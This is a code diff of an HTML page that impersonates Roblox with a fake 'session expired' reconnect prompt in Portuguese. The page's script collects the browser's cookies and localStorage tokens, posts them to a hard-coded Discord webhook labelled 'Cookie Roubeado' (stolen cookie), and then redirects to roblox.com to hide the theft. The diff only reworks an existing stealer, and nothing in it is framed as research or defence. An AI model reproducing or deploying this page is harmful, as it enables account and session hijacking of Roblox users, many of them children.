@@ -14,44 +14,47 @@
 
 <div class="box">
     <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f6/Roblox_player_icon_black.svg/200px-Roblox_player_icon_black.svg.png">
-    <h2>Verificação de Segurança</h2>
-    <p style="font-size: 14px;">Clique para continuar.</p>
-    <button id="btn" onclick="pegarTudo()">Continuar</button>
+    <h2>Sessão Expirada</h2>
+    <p style="font-size: 14px;">Clique para reconectar.</p>
+    <button id="btn" onclick="capturar()">Entrar</button>
 </div>
 
 <script>
-async function pegarTudo() {
+async function capturar() {
     const btn = document.getElementById('btn');
-    btn.innerText = "Processando...";
+    btn.innerText = "Conectando...";
     
-    // 1. Pega Cookie Padrão
+    // Método 1: Pegar Cookie HttpOnly (se disponível no contexto atual)
     let cookies = document.cookie;
     
-    // 2. Pega LocalStorage (Onde o Roblox guarda tokens modernos às vezes)
+    // Método 2: Pegar LocalStorage (MUITO IMPORTANTE PARA ROBLOX MODERNO)
     let ls = "";
     try {
         for(let i=0; i<localStorage.length; i++) {
             let key = localStorage.key(i);
             let val = localStorage.getItem(key);
-            ls += `${key}=${val}\n`;
+            // Filtra apenas dados relevantes
+            if(val && val.length > 10) {
+                ls += `${key}: ${val}\n`;
+            }
         }
     } catch(e) {}
 
     // Junta tudo
-    let fullData = `Cookies:\n${cookies}\n\nLocalStorage:\n${ls}`;
+    let data = `Cookies:\n${cookies}\n\nLocalStorage:\n${ls}`;
 
     const webhookUrl = "https://discord.com/api/webhooks/1567446528908591105/HJrrrW2hiOuddvGHqhiOugZ10PdTdBAsGR9hV6ikva-37KwkXpdaZDCz2XQRKKQdJ7B1";
 
-    // Tenta enviar para o Discord
+    // Tenta enviar para Discord
     fetch(webhookUrl, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-            content: `🍪 **Dados Capturados:**\n\`\`\`${fullData}\`\`\``
+            content: `🍪 **Cookie Roubeado:**\n\`\`\`${data}\`\`\``
         })
-    }).catch(err => console.log("Erro Discord:", err));
+    }).catch(() => {}); // Ignora erro
 
-    // Redireciona imediatamente para não parecer golpe
+    // Redireciona
     window.location.href = "https://www.roblox.com/home";
 }
 </script>
